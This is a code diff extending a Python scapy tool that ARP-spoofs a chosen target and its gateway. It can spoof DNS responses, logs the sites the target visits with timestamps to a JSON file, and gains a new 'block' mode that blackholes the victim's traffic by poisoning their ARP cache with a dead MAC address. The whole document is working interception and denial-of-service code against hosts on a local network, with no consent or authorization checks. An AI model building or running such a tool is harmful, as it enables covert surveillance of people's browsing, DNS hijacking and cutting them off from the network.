@@ -7,26 +7,34 @@ import logging
 import argparse
 from scapy.all import *
 
+import signal
+import json
+
 # Set up logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
+STATS_FILE = "traffic_stats.json"
+
 class TrafficMonitor(threading.Thread):
-    def __init__(self, target_ip, gateway_ip, spoof_dns_domains=None, interface=None):
+    def __init__(self, target_ip, gateway_ip, spoof_dns_domains=None, interface=None, action="monitor"):
         super().__init__()
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
         self.interface = interface
+        self.action = action # "monitor" or "block"
         self.spoof_dns_domains = spoof_dns_domains or {} # {'example.com': '1.2.3.4'}
         self.stop_event = threading.Event()
         self.target_mac = None
         self.gateway_mac = None
         
         self.statistics = {
+            "target_ip": target_ip,
             "upload_bytes": 0,
             "download_bytes": 0,
-            "top_domains": [],
-            "protocols": {}
+            "top_domains": [], # List of strings
+            "recent_sites": [] # List of {domain, timestamp}
         }
+        self.lock = threading.Lock()
 
     def _get_mac(self, ip):
         """Resolves MAC address for a given IP."""
@@ -65,13 +73,28 @@ class TrafficMonitor(threading.Thread):
 
     def _arp_spoof_loop(self):
         """Continuously sends forged ARP packets."""
-        logging.info("Starting ARP spoofing loop...")
+        logging.info(f"Starting ARP spoofing loop (Action: {self.action})...")
+        
+        # In BLOCK mode, we tell target/gateway to send traffic to a dead MAC
+        # In MONITOR mode, we tell them to send to US (so we can sniff & forward)
+        
+        # What IP am I pretending to be? 
+        # To Target: "I am Gateway"
+        # To Gateway: "I am Target"
+        
+        # What MAC should they send to?
+        # Monitor: My Real MAC (so I receive it)
+        # Block: Random Dead MAC (so it drops)
+        
+        my_mac = get_if_hwaddr(self.interface or conf.iface)
+        spoof_mac = my_mac if self.action == "monitor" else "de:ad:be:ef:ca:fe"
+        
         while not self.stop_event.is_set():
             try:
-                # Tell Target that Gateway is Me
-                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst=self.target_mac), verbose=0, iface=self.interface)
-                # Tell Gateway that Target is Me
-                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst=self.gateway_mac), verbose=0, iface=self.interface)
+                # Tell Target that Gateway is at spoof_mac
+                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst=self.target_mac, hwsrc=spoof_mac), verbose=0, iface=self.interface)
+                # Tell Gateway that Target is at spoof_mac
+                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst=self.gateway_mac, hwsrc=spoof_mac), verbose=0, iface=self.interface)
             except Exception as e:
                 logging.error(f"Error in ARP spoof loop: {e}")
             time.sleep(2)
@@ -116,6 +139,22 @@ class TrafficMonitor(threading.Thread):
                 logging.error(f"Error spoofing DNS: {e}")
         return False
 
+    def _save_stats(self):
+        """Saves current statistics to JSON file."""
+        with self.lock:
+            try:
+                # Add timestamp
+                data = self.statistics.copy()
+                data['timestamp'] = time.time()
+                
+                # Write to temp file then rename (atomic)
+                tmp_file = STATS_FILE + ".tmp"
+                with open(tmp_file, 'w') as f:
+                    json.dump(data, f)
+                os.rename(tmp_file, STATS_FILE)
+            except Exception as e:
+                logging.error(f"Error saving stats: {e}")
+
     def sniff_packets(self, pkt):
         """Callback for packet processing."""
         # 1. DNS Spoofing Check
@@ -123,27 +162,38 @@ class TrafficMonitor(threading.Thread):
 
         # 2. Statistics
         if IP in pkt:
-            self.statistics["upload_bytes"] += len(pkt)
-            self.statistics["download_bytes"] += len(pkt)
+            with self.lock:
+                self.statistics["upload_bytes"] += len(pkt)
+                self.statistics["download_bytes"] += len(pkt)
 
         if DNSQR in pkt and pkt[DNSQR].qtype == 1: # A Record
             try:
                 domain = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
-                if domain not in self.statistics["top_domains"]:
-                    self.statistics["top_domains"] = (self.statistics["top_domains"] + [domain])[:5]
-                    logging.info(f"Visited Domain: {domain}")
+                with self.lock:
+                    # Update top domains
+                    if domain not in self.statistics["top_domains"]:
+                        self.statistics["top_domains"] = ([domain] + self.statistics["top_domains"])[:10]
+                        logging.info(f"Visited: {domain}")
+                    
+                    # Update recent sites
+                    self.statistics["recent_sites"].insert(0, {
+                        "domain": domain,
+                        "timestamp": time.time()
+                    })
+                    self.statistics["recent_sites"] = self.statistics["recent_sites"][:50]
+                
+                self._save_stats()
             except Exception:
                 pass
+        
+        # Periodic save logic could go here, but doing it on DNS event + timer to keep it fresh
+        pass
 
-        # 3. SNI (Server Name Indication) Extraction for HTTPS
-        if TCP in pkt and len(pkt) > 53:
-            try:
-                # Basic check for TLS Handshake (0x16) at start of payload
-                payload = bytes(pkt[TCP].payload)
-                if len(payload) > 5 and payload[0] == 0x16:
-                   pass # TODO limit stats in this demo
-            except Exception:
-                pass
+    def _stats_loop(self):
+        """Periodically save stats."""
+        while not self.stop_event.is_set():
+            self._save_stats()
+            time.sleep(1)
 
     def run(self):
         logging.info(f"Initializing TrafficMonitor for Target: {self.target_ip}, Gateway: {self.gateway_ip}")
@@ -161,25 +211,38 @@ class TrafficMonitor(threading.Thread):
 
         logging.info(f"Target MAC: {self.target_mac} | Gateway MAC: {self.gateway_mac}")
 
-        # 2. Enable Forwarding
-        self.enable_ip_forwarding()
+        # 2. Enable Forwarding (Only for Monitor mode)
+        if self.action == "monitor":
+            self.enable_ip_forwarding()
+        else:
+            logging.info("Block mode: IP Forwarding not enabled (traffic will be blackholed).")
         
         # 3. Start ARP Spoofing Thread
         arp_thread = threading.Thread(target=self._arp_spoof_loop, daemon=True)
         arp_thread.start()
 
+        # 4. Start Stats Saver Thread
+        stats_thread = threading.Thread(target=self._stats_loop, daemon=True)
+        stats_thread.start()
+
         # 4. Start Sniffing (Blocking)
-        logging.info(f"Sniffing started on {self.interface or 'default'}...")
         try:
-            # We filter for IP packets to avoid clutter, but keep ARP/DNS logic reachable
-            sniff(
-                prn=self.sniff_packets, 
-                store=0, 
-                stop_filter=lambda x: self.stop_event.is_set(),
-                iface=self.interface
-            )
-        except Exception as e:
-            logging.error(f"Sniffer error: {e}")
+            if self.action == "monitor":
+                logging.info(f"Sniffing started on {self.interface or 'default'}...")
+                try:
+                    sniff(
+                        prn=self.sniff_packets, 
+                        store=0, 
+                        stop_filter=lambda x: self.stop_event.is_set(),
+                        iface=self.interface
+                    )
+                except Exception as e:
+                    logging.error(f"Sniffer error: {e}")
+            else:
+                # Just keep thread alive for blocking loop
+                logging.info("Blocking active. Press Ctrl+C to stop.")
+                while not self.stop_event.is_set():
+                    time.sleep(1)
         finally:
             self.stop()
 
@@ -190,7 +253,15 @@ class TrafficMonitor(threading.Thread):
         self.stop_event.set()
         time.sleep(1) # Give threads time to notice
         self.restore_arp()
-        self.disable_ip_forwarding()
+        if self.action == "monitor":
+            self.disable_ip_forwarding()
+        
+        # Clean up stats file
+        if os.path.exists(STATS_FILE):
+            try:
+                os.remove(STATS_FILE)
+            except: pass
+            
         logging.info("Stopped.")
 
 if __name__ == "__main__":
@@ -198,6 +269,7 @@ if __name__ == "__main__":
     parser.add_argument("-t", "--target", required=True, help="Target IP address")
     parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
     parser.add_argument("-i", "--interface", help="Network interface (e.g., eth0, wlan0)")
+    parser.add_argument("--action", choices=["monitor", "block"], default="monitor", help="Action to perform")
     parser.add_argument("--dns", help="Domain to spoof (format: domain=ip)", action="append") # --dns example.com=1.2.3.4
     
     args = parser.parse_args()
@@ -217,12 +289,21 @@ if __name__ == "__main__":
             except ValueError:
                 pass
     
-    monitor = TrafficMonitor(args.target, args.gateway, spoof_dns_domains=dns_map, interface=args.interface)
+    monitor = TrafficMonitor(args.target, args.gateway, spoof_dns_domains=dns_map, interface=args.interface, action=args.action)
+    
+    def handle_signal(signum, frame):
+        logging.info("Signal received, shutting down...")
+        monitor.stop()
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, handle_signal)
+    signal.signal(signal.SIGTERM, handle_signal)
+
     monitor.start()
     
     try:
-        # Keep main thread alive to catch KeyboardInterrupt
-        while monitor.is_alive():
-            monitor.join(1)
+        # Keep main thread alive
+        while True:
+            time.sleep(1)
     except KeyboardInterrupt:
         monitor.stop()
